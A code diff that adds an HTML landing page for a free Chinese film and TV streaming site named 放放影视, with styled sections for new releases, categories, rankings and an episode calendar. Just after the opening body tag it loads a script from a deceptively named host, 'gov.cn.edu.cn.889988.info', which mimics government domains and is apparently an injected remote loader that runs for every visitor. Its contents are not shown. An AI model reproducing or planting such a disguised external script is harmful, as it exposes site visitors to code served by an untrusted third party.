@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="放放影视 - 免费高清影视在线观看平台，提供最新电影、热播电视剧、综艺节目、动漫番剧等丰富影视资源，畅享随时随地观影乐趣。">
+<meta name="keywords" content="放放影视,影视,电影,电视剧,综艺,动漫,在线观看,高清影视,免费视频">
+<meta name="author" content="放放影视">
+<meta name="robots" content="index,follow">
+<title>放放影视 - 免费高清影视在线观看平台 | 电影电视剧综艺动漫</title>
+<style>
+    /* ================= 全局重置 ================= */
+    *,*::before,*::after { margin:0; padding:0; box-sizing:border-box; }
+    html { scroll-behavior:smooth; -webkit-text-size-adjust:100%; }
+    body {
+        font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;
+        background:#07090f; color:#e4e7ee; line-height:1.65; overflow-x:hidden;
+    }
+    a { text-decoration:none; color:inherit; }
+    ul { list-style:none; }
+    img { max-width:100%; display:block; }
+
+    /* ================= 工具类 ================= */
+    .container { width:100%; max-width:1200px; margin:0 auto; padding:0 22px; }
+
+    /* ================= 顶部导航 ================= */
+    .site-header {
+        position:fixed; top:0; left:0; width:100%; z-index:999;
+        background:rgba(7,9,15,.94); backdrop-filter:blur(12px);
+        border-bottom:1px solid rgba(0,229,255,.08);
+    }
+    .nav-row { display:flex; align-items:center; justify-content:space-between; height:66px; }
+    .brand-logo {
+        font-size:26px; font-weight:900; letter-spacing:2px;
+        color:#00e5ff; text-shadow:0 0 18px rgba(0,229,255,.4);
+    }
+    .brand-logo small { display:block; font-size:11px; letter-spacing:4px; color:#6b7280; font-weight:400; margin-top:-2px; }
+    .nav-links { display:flex; gap:30px; }
+    .nav-links a {
+        font-size:15px; color:#c4cad6; position:relative; padding:6px 0; transition:color .3s;
+    }
+    .nav-links a::before {
+        content:''; position:absolute; left:0; bottom:0; width:0; height:2px;
+        background:#00e5ff; transition:width .3s;
+    }
+    .nav-links a:hover { color:#00e5ff; }
+    .nav-links a:hover::before { width:100%; }
+    .mobile-toggle { display:none; flex-direction:column; gap:5px; cursor:pointer; }
+    .mobile-toggle b { width:25px; height:2px; background:#00e5ff; display:block; border-radius:2px; }
+
+    /* ================= Hero ================= */
+    .hero-section {
+        min-height:100vh; display:flex; align-items:center;
+        background:
+            radial-gradient(ellipse at 20% 10%, rgba(0,229,255,.12), transparent 55%),
+            radial-gradient(ellipse at 85% 90%, rgba(120,80,255,.12), transparent 50%),
+            #07090f;
+        padding-top:66px; position:relative; overflow:hidden;
+    }
+    .hero-section .container { position:relative; z-index:2; }
+    .hero-tag {
+        display:inline-block; padding:6px 18px; border:1px solid rgba(0,229,255,.35);
+        border-radius:30px; color:#00e5ff; font-size:13px; letter-spacing:2px; margin-bottom:24px;
+    }
+    .hero-section h1 { font-size:clamp(34px,7vw,64px); font-weight:900; line-height:1.15; margin-bottom:22px; }
+    .hero-section h1 span { color:#00e5ff; }
+    .hero-section > .container > p { font-size:clamp(15px,2.5vw,19px); color:#93a1b5; max-width:620px; margin-bottom:38px; }
+    .hero-actions { display:flex; gap:16px; flex-wrap:wrap; }
+    .btn-main {
+        padding:15px 42px; border-radius:50px; font-size:16px; font-weight:700;
+        background:linear-gradient(135deg,#00e5ff,#7850ff); color:#07090f;
+        box-shadow:0 8px 28px rgba(0,229,255,.3); transition:transform .3s,box-shadow .3s;
+    }
+    .btn-main:hover { transform:translateY(-4px); box-shadow:0 14px 36px rgba(0,229,255,.45); }
+    .btn-line { padding:15px 42px; border-radius:50px; font-size:16px; font-weight:700; border:2px solid rgba(0,229,255,.35); color:#00e5ff; }
+
+    /* ================= 通用区块 ================= */
+    .block { padding:96px 0; }
+    .block-head { text-align:center; margin-bottom:58px; }
+    .block-head em {
+        font-style:normal; font-size:13px; letter-spacing:5px; color:#00e5ff; display:block; margin-bottom:14px;
+    }
+    .block-head h2 { font-size:clamp(26px,4.5vw,42px); font-weight:800; }
+    .block-head p { color:#7d8899; margin-top:12px; font-size:16px; }
+
+    /* ---- 栏目1：正在热映 → 横向滑动条结构 ---- */
+    .now-show { background:rgba(0,229,255,.02); }
+    .scroll-row { display:flex; gap:20px; overflow-x:auto; padding-bottom:16px; scroll-snap-type:x mandatory; }
+    .scroll-row::-webkit-scrollbar { height:6px; }
+    .scroll-row::-webkit-scrollbar-thumb { background:rgba(0,229,255,.3); border-radius:3px; }
+    .film-strip {
+        flex:0 0 260px; scroll-snap-align:start; border-radius:18px; overflow:hidden;
+        background:#0f1320; border:1px solid rgba(0,229,255,.06); transition:transform .3s;
+    }
+    .film-strip:hover { transform:scale(1.04); }
+    .strip-cover { aspect-ratio:16/10; display:flex; align-items:center; justify-content:center; font-size:48px; }
+    .s1 { background:linear-gradient(135deg,#0f2027,#203a43,#2c5364); }
+    .s2 { background:linear-gradient(135deg,#3a1c71,#d76d77,#ffaf7b); }
+    .s3 { background:linear-gradient(135deg,#0b486b,#f56217); }
+    .s4 { background:linear-gradient(135deg,#42275a,#734b6d); }
+    .s5 { background:linear-gradient(135deg,#1d976c,#93f9b9); }
+    .s6 { background:linear-gradient(135deg,#eb5757,#000000); }
+    .strip-info { padding:16px; }
+    .strip-info h3 { font-size:17px; margin-bottom:6px; }
+    .strip-info .row { display:flex; justify-content:space-between; font-size:13px; color:#7d8899; }
+    .strip-info .row b { color:#00e5ff; }
+
+    /* ---- 栏目2：影视分类 → 六边形网格结构 ---- */
+    .hex-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:26px; }
+    .hex-item {
+        position:relative; height:180px; border-radius:22px; overflow:hidden;
+        display:flex; flex-direction:column; align-items:center; justify-content:center; gap:10px;
+        cursor:pointer; transition:transform .35s;
+    }
+    .hex-item:hover { transform:translateY(-10px); }
+    .hex-item .big-emoji { font-size:52px; }
+    .hex-item h4 { font-size:19px; }
+    .hex-item p { font-size:13px; opacity:.8; }
+    .h1 { background:linear-gradient(160deg,#00c6ff,#0072ff); }
+    .h2 { background:linear-gradient(160deg,#f7971e,#ffd200); }
+    .h3 { background:linear-gradient(160deg,#11998e,#38ef7d); }
+    .h4 { background:linear-gradient(160deg,#fc466b,#3f5efb); }
+    .h5 { background:linear-gradient(160deg,#8e2de2,#4a00e0); }
+    .h6 { background:linear-gradient(160deg,#ff416c,#ff4b2b); }
+
+    /* ---- 栏目3：高分榜单 → 表格化排行结构 ---- */
+    .top-table { background:rgba(255,255,255,.02); border-radius:20px; overflow:hidden; border:1px solid rgba(255,255,255,.05); }
+    .top-row {
+        display:grid; grid-template-columns:70px 60px 1fr 120px 90px; align-items:center;
+        gap:16px; padding:18px 24px; border-bottom:1px solid rgba(255,255,255,.04); transition:background .3s;
+    }
+    .top-row:last-child { border-bottom:none; }
+    .top-row:hover { background:rgba(0,229,255,.05); }
+    .top-row .rank {
+        font-size:26px; font-weight:900; text-align:center;
+        color:rgba(255,255,255,.2);
+    }
+    .top-row:nth-child(1) .rank { color:#ffd700; }
+    .top-row:nth-child(2) .rank { color:#c0c0c0; }
+    .top-row:nth-child(3) .rank { color:#cd7f32; }
+    .top-row .mini { width:48px; height:48px; border-radius:12px; display:flex; align-items:center; justify-content:center; font-size:24px; background:linear-gradient(135deg,#1a2238,#0f1320); }
+    .top-row .info h4 { font-size:17px; }
+    .top-row .info span { font-size:13px; color:#7d8899; }
+    .top-row .type-tag { text-align:center; font-size:13px; color:#93a1b5; }
+    .top-row .score-num { text-align:right; font-size:22px; font-weight:800; color:#00e5ff; }
+
+    /* ---- 栏目4：追剧日历 → 周历网格结构 ---- */
+    .cal-wrap { background:linear-gradient(150deg,#0d1428,#07090f); border-radius:24px; padding:36px; border:1px solid rgba(0,229,255,.08); }
+    .cal-grid { display:grid; grid-template-columns:repeat(7,1fr); gap:12px; }
+    .cal-day { text-align:center; padding:14px 6px; border-radius:14px; background:rgba(255,255,255,.03); border:1px solid rgba(255,255,255,.04); transition:all .3s; }
+    .cal-day:hover { background:rgba(0,229,255,.1); border-color:#00e5ff; }
+    .cal-day b { display:block; font-size:16px; margin-bottom:8px; color:#00e5ff; }
+    .cal-day span { font-size:11px; color:#93a1b5; display:block; line-height:1.5; }
+    .cal-day.today { background:linear-gradient(135deg,#00e5ff,#7850ff); border-color:transparent; }
+    .cal-day.today b, .cal-day.today span { color:#fff; }
+
+    /* ---- 栏目5：平台优势 → 垂直时间轴结构 ---- */
+    .timeline { position:relative; padding-left:40px; }
+    .timeline::before {
+        content:''; position:absolute; left:12px; top:0; bottom:0; width:2px;
+        background:linear-gradient(180deg,#00e5ff,transparent);
+    }
+    .tl-node { position:relative; margin-bottom:38px; }
+    .tl-node::before {
+        content:''; position:absolute; left:-40px; top:4px; width:22px; height:22px;
+        border-radius:50%; background:#07090f; border:3px solid #00e5ff;
+    }
+    .tl-node h3 { font-size:20px; margin-bottom:8px; color:#00e5ff; }
+    .tl-node p { color:#93a1b5; font-size:15px; }
+
+    /* ================= 页脚 ================= */
+    .site-footer { background:#040609; padding:60px 0 28px; border-top:1px solid rgba(0,229,255,.06); }
+    .foot-cols { display:grid; grid-template-columns:2fr 1fr 1fr 1fr; gap:40px; margin-bottom:44px; }
+    .foot-about .brand-logo { font-size:22px; }
+    .foot-about p { color:#6b7280; font-size:14px; margin-top:16px; max-width:300px; }
+    .foot-col h5 { font-size:16px; margin-bottom:18px; color:#e4e7ee; }
+    .foot-col a { display:block; color:#7d8899; font-size:14px; padding:5px 0; transition:color .3s; }
+    .foot-col a:hover { color:#00e5ff; }
+    .copy-line { text-align:center; padding-top:28px; border-top:1px solid rgba(255,255,255,.04); color:#55606f; font-size:13px; line-height:1.8; }
+
+    /* ================= 响应式 ================= */
+    @media (max-width:900px) {
+        .nav-links {
+            position:fixed; top:66px; left:0; width:100%; height:calc(100vh - 66px);
+            background:#07090f; flex-direction:column; align-items:center; justify-content:center;
+            gap:34px; transform:translateX(-100%); transition:transform .4s;
+        }
+        .nav-links.show { transform:translateX(0); }
+        .nav-links a { font-size:22px; }
+        .mobile-toggle { display:flex; }
+        .foot-cols { grid-template-columns:1fr 1fr; }
+        .top-row { grid-template-columns:50px 44px 1fr 70px; }
+        .top-row .type-tag { display:none; }
+        .cal-grid { grid-template-columns:repeat(4,1fr); }
+    }
+    @media (max-width:560px) {
+        .block { padding:64px 0; }
+        .foot-cols { grid-template-columns:1fr; }
+        .cal-grid { grid-template-columns:repeat(2,1fr); }
+        .hero-actions .btn-main, .hero-actions .btn-line { width:100%; text-align:center; }
+        .cal-wrap { padding:22px 16px; }
+    }
+</style>
+</head>
+<body id="top">
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<!-- ========== 顶部导航 ========== -->
+<header class="site-header">
+    <div class="container nav-row">
+        <a href="#top" class="brand-logo">放放影视<small>FANGFANG MEDIA</small></a>
+        <nav class="nav-links" id="navMenu">
+            <a href="#home">首页推荐</a>
+            <a href="#nowshow">正在热映</a>
+            <a href="#category">影视分类</a>
+            <a href="#toplist">高分榜单</a>
+            <a href="#calendar">追剧日历</a>
+            <a href="#advantage">平台优势</a>
+        </nav>
+        <div class="mobile-toggle" id="mobToggle"><b></b><b></b><b></b></div>
+    </div>
+</header>
+
+<!-- ========== Hero 首屏 ========== -->
+<section class="hero-section">
+    <div class="container">
+        <span class="hero-tag">🔥 全网热播 · 免费观看</span>
+        <h1>放放影视<br><span>让好剧自由放映</span></h1>
+        <p>放放影视汇聚海量高清电影、热播电视剧、综艺节目与动漫番剧，全程免费、极速播放、多端同步，随时随地畅享视听盛宴。</p>
+        <div class="hero-actions">
+            <a href="#nowshow" class="btn-main">开始观影</a>
+            <a href="#category" class="btn-line">浏览分类</a>
+        </div>
+    </div>
+</section>
+
+<!-- ========== 栏目1：正在热映（横向滑动条） ========== -->
+<section class="block now-show" id="nowshow">
+    <div class="container">
+        <div class="block-head">
+            <em>NOW SHOWING</em>
+            <h2>正在热映</h2>
+            <p>院线与网络同步，追剧不等待</p>
+        </div>
+        <div class="scroll-row">
+            <article class="film-strip">
+                <div class="strip-cover s1">🎬</div>
+                <div class="strip-info">
+                    <h3>长空之翼</h3>
+                    <div class="row"><span>动作 / 2026</span><b>9.1</b></div>
+                </div>
+            </article>
+            <article class="film-strip">
+                <div class="strip-cover s2">💑</div>
+                <div class="strip-info">
+                    <h3>夏日恋曲</h3>
+                    <div class="row"><span>爱情 / 2026</span><b>8.4</b></div>
+                </div>
+            </article>
+            <article class="film-strip">
+                <div class="strip-cover s3">🕵️‍♂️</div>
+                <div class="strip-info">
+                    <h3>暗网追踪</h3>
+                    <div class="row"><span>悬疑 / 2026</span><b>8.9</b></div>
+                </div>
+            </article>
+            <article class="film-strip">
+                <div class="strip-cover s4">👻</div>
+                <div class="strip-info">
+                    <h3>诡夜惊魂</h3>
+                    <div class="row"><span>恐怖 / 2025</span><b>7.8</b></div>
+                </div>
+            </article>
+            <article class="film-strip">
+                <div class="strip-cover s5">🌿</div>
+                <div class="strip-info">
+                    <h3>山河故人</h3>
+                    <div class="row"><span>剧情 / 2026</span><b>9.3</b></div>
+                </div>
+            </article>
+            <article class="film-strip">
+                <div class="strip-cover s6">🚀</div>
+                <div class="strip-info">
+                    <h3>火星移民</h3>
+                    <div class="row"><span>科幻 / 2026</span><b>8.7</b></div>
+                </div>
+            </article>
+        </div>
+    </div>
+</section>
+
+<!-- ========== 栏目2：影视分类（六边形色块网格） ========== -->
+<section class="block" id="category">
+    <div class="container">
+        <div class="block-head">
+            <em>CATEGORIES</em>
+            <h2>影视分类</h2>
+            <p>六大频道，精准匹配你的口味</p>
+        </div>
+        <div class="hex-grid">
+            <div class="hex-item h1"><span class="big-emoji">🎥</span><h4>电影</h4><p>院线大片</p></div>
+            <div class="hex-item h2"><span class="big-emoji">📺</span><h4>电视剧</h4><p>热播剧集</p></div>
+            <div class="hex-item h3"><span class="big-emoji">🎤</span><h4>综艺</h4><p>爆笑娱乐</p></div>
+            <div class="hex-item h4"><span class="big-emoji">🐱</span><h4>动漫</h4><p>番剧全集</p></div>
+            <div class="hex-item h5"><span class="big-emoji">📽️</span><h4>纪录片</h4><p>真实影像</p></div>
+            <div class="hex-item h6"><span class="big-emoji">🎭</span><h4>短剧</h4><p>精选微剧</p></div>
+        </div>
+    </div>
+</section>
+
+<!-- ========== 栏目3：高分榜单（排行表格） ========== -->
+<section class="block" id="toplist" style="background:rgba(255,255,255,.015);">
+    <div class="container">
+        <div class="block-head">
+            <em>TOP RANKING</em>
+            <h2>高分榜单</h2>
+            <p>观众口碑之选，好剧不容错过</p>
+        </div>
+        <div class="top-table">
+            <div class="top-row">
+                <div class="rank">1</div>
+                <div class="mini">🏆</div>
+                <div class="info"><h4>山河故人</h4><span>剧情 · 156分钟</span></div>
+                <div class="type-tag">院线电影</div>
+                <div class="score-num">9.3</div>
+            </div>
+            <div class="top-row">
+                <div class="rank">2</div>
+                <div class="mini">🎯</div>
+                <div class="info"><h4>暗网追踪</h4><span>悬疑 · 24集</span></div>
+                <div class="type-tag">网络剧集</div>
+                <div class="score-num">8.9</div>
+            </div>
+            <div class="top-row">
+                <div class="rank">3</div>
+                <div class="mini">🚀</div>
+                <div class="info"><h4>火星移民</h4><span>科幻 · 120分钟</span></div>
+                <div class="type-tag">院线电影</div>
+                <div class="score-num">8.7</div>
+            </div>
+            <div class="top-row">
+                <div class="rank">4</div>
+                <div class="mini">🎬</div>
+                <div class="info"><h4>长空之翼</h4><span>动作 · 138分钟</span></div>
+                <div class="type-tag">院线电影</div>
+                <div class="score-num">8.5</div>
+            </div>
+            <div class="top-row">
+                <div class="rank">5</div>
+                <div class="mini">💑</div>
+                <div class="info"><h4>夏日恋曲</h4><span>爱情 · 18集</span></div>
+                <div class="type-tag">网络剧集</div>
+                <div class="score-num">8.4</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ========== 栏目4：追剧日历（周历网格） ========== -->
+<section class="block" id="calendar">
+    <div class="container">
+        <div class="block-head">
+            <em>WEEKLY SCHEDULE</em>
+            <h2>追剧日历</h2>
+            <p>每日更新，不再错过精彩剧集</p>
+        </div>
+        <div class="cal-wrap">
+            <div class="cal-grid">
+                <div class="cal-day"><b>周一</b><span>山河故人<br>更新第8集</span></div>
+                <div class="cal-day today"><b>周二</b><span>暗网追踪<br>更新第12集</span></div>
+                <div class="cal-day"><b>周三</b><span>夏日恋曲<br>更新第6集</span></div>
+                <div class="cal-day"><b>周四</b><span>火星移民<br>独家上线</span></div>
+                <div class="cal-day"><b>周五</b><span>爆笑综艺<br>周五晚8点</span></div>
+                <div class="cal-day"><b>周六</b><span>动漫新番<br>双集连播</span></div>
+                <div class="cal-day"><b>周日</b><span>经典回看<br>高分推荐</span></div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ========== 栏目5：平台优势（垂直时间轴） ========== -->
+<section class="block" id="advantage" style="background:rgba(0,229,255,.02);">
+    <div class="container">
+        <div class="block-head">
+            <em>OUR ADVANTAGE</em>
+            <h2>平台优势</h2>
+            <p>为什么选择放放影视</p>
+        </div>
+        <div class="timeline">
+            <div class="tl-node">
+                <h3>海量资源 永久免费</h3>
+                <p>放放影视收录上万部电影、电视剧、综艺与动漫，全部免费在线观看，无需注册即可播放。</p>
+            </div>
+            <div class="tl-node">
+                <h3>极速播放 高清画质</h3>
+                <p>采用智能CDN加速，支持1080P与4K超清播放，告别卡顿与漫长加载。</p>
+            </div>
+            <div class="tl-node">
+                <h3>每日更新 同步首发</h3>
+                <p>院线大片、热播网剧第一时间上线，与全网同步更新，追剧不落人后。</p>
+            </div>
+            <div class="tl-node">
+                <h3>多端适配 随时观影</h3>
+                <p>完美适配手机、平板、电脑与智能电视，账号云同步，跨设备无缝续播。</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ========== 页脚 ========== -->
+<footer class="site-footer">
+    <div class="container">
+        <div class="foot-cols">
+            <div class="foot-about">
+                <a href="#top" class="brand-logo">放放影视<small>FANGFANG MEDIA</small></a>
+                <p>放放影视致力于打造免费、高清、便捷的在线影视平台，让每个人都能轻松享受优质视听内容。</p>
+            </div>
+            <div class="foot-col">
+                <h5>影片导航</h5>
+                <a href="#nowshow">正在热映</a>
+                <a href="#category">影视分类</a>
+                <a href="#toplist">高分榜单</a>
+                <a href="#calendar">追剧日历</a>
+            </div>
+            <div class="foot-col">
+                <h5>内容频道</h5>
+                <a href="#">电影</a>
+                <a href="#">电视剧</a>
+                <a href="#">综艺</a>
+                <a href="#">动漫</a>
+            </div>
+            <div class="foot-col">
+                <h5>关于我们</h5>
+                <a href="#">平台介绍</a>
+                <a href="#">免责声明</a>
+                <a href="#">意见反馈</a>
+                <a href="#">联系我们</a>
+            </div>
+        </div>
+        <div class="copy-line">
+            网站名称：放放影视 | 网站网址：https://fangfangyingshi-cn.github.io<br>
+            © 2026 放放影视 版权所有. All Rights Reserved.
+        </div>
+    </div>
+</footer>
+
+<script>
+    var toggle = document.getElementById('mobToggle');
+    var menu = document.getElementById('navMenu');
+    toggle.addEventListener('click', function(){ menu.classList.toggle('show'); });
+    menu.querySelectorAll('a').forEach(function(a){
+        a.addEventListener('click', function(){ menu.classList.remove('show'); });
+    });
+</script>
+</body>
+</html>
